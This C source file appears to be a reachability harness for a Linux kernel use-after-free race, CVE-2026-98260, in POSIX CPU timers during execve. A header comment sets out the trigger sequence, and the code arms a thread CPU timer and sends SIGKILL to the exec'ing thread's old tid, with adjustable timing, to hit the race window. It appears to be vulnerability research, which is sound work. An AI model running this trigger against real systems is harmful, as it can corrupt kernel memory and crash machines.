/*
 * CVE-2026-98260 reachability harness, v2 — implements the trigger sequence
 * from the upstream commit message:
 *
 *   child leader spawns thread B
 *   B: timer_create(CLOCK_THREAD_CPUTIME_ID) + timer_settime()  -> node queued on B
 *   B: execve() -> begin_new_exec() -> de_thread() -> exchange_tids(B, leader)
 *   PARENT: kill(B_old_tid, SIGKILL) while begin_new_exec() is between
 *           de_thread() and posix_cpu_timers_exit()
 *     -> exec_mmap()'s mmap_read_lock_killable() returns -EINTR
 *     -> do_exit() -> exit_itimers() frees k_itimer while its node is still
 *        queued on the task
 *     -> parent's wait4() -> release_task() -> posix_cpu_timers_exit()
 *        -> cleanup_timerqueue() -> timerqueue_del() on freed node = UAF
 *
 * The killer MUST be the parent (a separate process): any sibling thread of B
 * is destroyed by de_thread() before it could deliver the signal.
 *
 * Usage: trigger_race [--dry] [--iters N] [--delay-us N] [--exec PATH]
 *   --dry : never arm the timer (mechanics only, cannot reach the window)
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

struct shared {
    volatile int b_tid;      /* thread B's tid, published before execve */
    volatile int armed;      /* timer armed */
    volatile int go;         /* set immediately before the execve syscall */
    volatile int execing;    /* 1 = in execve, -1 = execve returned (EINTR) */
};

static void spin_ns(long ns) {
    struct timespec a, b;
    if (ns <= 0) return;
    clock_gettime(CLOCK_MONOTONIC, &a);
    for (;;) {
        clock_gettime(CLOCK_MONOTONIC, &b);
        long long d = (long long)(b.tv_sec - a.tv_sec) * 1000000000LL
                    + (b.tv_nsec - a.tv_nsec);
        if (d >= ns) return;
    }
}

static struct shared *g_sh;

static void *thread_b(void *arg) {
    int dry = *(int *)arg;
    struct sigevent sev;
    struct itimerspec its;
    timer_t t;
    char *const argv[] = { "/system/bin/true", NULL };
    char *const envp[] = { NULL };

    g_sh->b_tid = (int)syscall(SYS_gettid);

    if (!dry) {
        memset(&sev, 0, sizeof(sev));
        sev.sigev_notify = SIGEV_SIGNAL;
        sev.sigev_signo = SIGALRM;
        if (timer_create(CLOCK_THREAD_CPUTIME_ID, &sev, &t) != 0) {
            g_sh->armed = -1;
            return NULL;
        }
        /* Long enough to stay armed across de_thread(), short enough to be
         * pending when the cleanup race happens. */
        memset(&its, 0, sizeof(its));
        its.it_value.tv_nsec = 500000000L;   /* 500 ms of B's CPU time */
        if (timer_settime(t, 0, &its, NULL) != 0) {
            g_sh->armed = -2;
            return NULL;
        }
    }
    g_sh->armed = 1;
    g_sh->execing = 1;
    /* Publish "about to enter the syscall" as late as possible. */
    __sync_synchronize();
    g_sh->go = 1;

    execve(argv[0], argv, envp);
    /* Only reached when execve fails, e.g. -EINTR from exec_mmap(). */
    g_sh->execing = -1;
    return NULL;
}

int main(int argc, char **argv) {
    int dry = 0, iters = 200;
    long delay_ns = 0;
    const char *exec_path = "/system/bin/true";

    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--dry")) dry = 1;
        else if (!strcmp(argv[i], "--iters") && i + 1 < argc) iters = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--delay-ns") && i + 1 < argc) delay_ns = atol(argv[++i]);
        else if (!strcmp(argv[i], "--delay-us") && i + 1 < argc) delay_ns = atol(argv[++i]) * 1000;
        else if (!strcmp(argv[i], "--exec") && i + 1 < argc) exec_path = argv[++i];
        else { fprintf(stderr, "bad arg %s\n", argv[i]); return 2; }
    }

    g_sh = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (g_sh == MAP_FAILED) { perror("mmap"); return 3; }

    printf("[*] mode=%s iters=%d delay_ns=%ld exec=%s uid=%d\n",
           dry ? "DRY" : "RACE", iters, delay_ns, exec_path, (int)getuid());
    fflush(stdout);

    int killed = 0, exited = 0, other = 0, window = 0;
    for (int it = 0; it < iters; it++) {
        memset(g_sh, 0, sizeof(*g_sh));
        pid_t pid = fork();
        if (pid == 0) {
            pthread_t th;
            int d = dry;
            if (pthread_create(&th, NULL, thread_b, &d) != 0) _exit(70);
            /* Leader stays alive so de_thread() has something to kill. */
            for (;;) pause();
            _exit(0);
        }
        if (pid < 0) { perror("fork"); return 4; }

        /* Wait until B is about to enter execve(). */
        int spins = 0;
        while ((g_sh->b_tid == 0 || g_sh->armed == 0) && spins++ < 2000000)
            sched_yield();
        if (g_sh->armed < 0) {
            printf("[!] timer setup failed armed=%d\n", g_sh->armed);
            kill(pid, SIGKILL);
            waitpid(pid, NULL, 0);
            other++;
            continue;
        }
        spins = 0;
        while (g_sh->go == 0 && spins++ < 2000000)
            sched_yield();

        /* Busy-wait the requested offset (ns) so the kill can land in the
         * slice between de_thread() and posix_cpu_timers_exit(). */
        spin_ns(delay_ns);

        /* Signal B's old tid: after exchange_tids() that PID belongs to the
         * task now running begin_new_exec(). */
        if (g_sh->b_tid > 0) kill(g_sh->b_tid, SIGKILL);

        int st = 0;
        waitpid(pid, &st, 0);
        if (WIFSIGNALED(st) && WTERMSIG(st) == SIGKILL) killed++;
        else if (WIFEXITED(st)) exited++;
        else other++;
        /* execing == -1 means execve() returned, i.e. it failed inside
         * begin_new_exec() after the point of no return (exec_mmap -EINTR).
         * That is exactly the window the fix closes. */
        if (g_sh->execing == -1) window++;

        if ((it + 1) % 50 == 0) {
            printf("[*] %d/%d  killed=%d exited=%d other=%d window_hits=%d\n",
                   it + 1, iters, killed, exited, other, window);
            fflush(stdout);
        }
    }

    printf("[*] done killed=%d exited=%d other=%d window_hits=%d\n",
           killed, exited, other, window);
    /* "killed" is the expected classification in BOTH vulnerable and fixed
     * kernels: this harness measures window reachability, not the bug. */
    return 0;
}
